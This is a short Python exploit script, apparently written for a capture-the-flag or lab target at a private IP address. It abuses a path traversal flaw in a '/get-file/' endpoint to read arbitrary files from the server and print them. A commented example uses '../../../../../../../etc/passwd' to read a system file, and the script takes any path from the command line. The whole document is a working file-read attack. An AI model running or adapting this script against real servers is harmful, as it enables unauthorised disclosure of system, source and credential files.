import sys
import json
import urllib
import requests as rq

url = 'http://10.10.86.199/get-file/'

def dump_file(path):
    path = urllib.parse.quote_plus(path)
    data = json.loads(rq.get(url + path).text)['info']
    print(data)

# dump_file('server.js')
# dump_file('../../../../../../../etc/passwd')

f = sys.argv[1]
dump_file(f)
